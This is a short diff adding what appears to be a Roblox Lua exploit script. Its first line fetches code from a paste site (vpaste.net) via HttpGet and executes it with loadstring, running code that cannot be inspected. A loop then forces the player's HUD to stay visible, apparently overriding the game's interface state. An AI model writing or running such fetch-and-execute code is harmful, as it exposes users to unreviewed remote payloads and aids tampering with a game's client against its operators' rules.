@@ -1,0 +1,8 @@
+loadstring(game:HttpGet("http://vpaste.net/DA4s8"))()
+
+while true do
+    if game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.HUD.Visible == false then
+        game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.HUD.Visible = true
+    end
+    task.wait(0.01)
+end
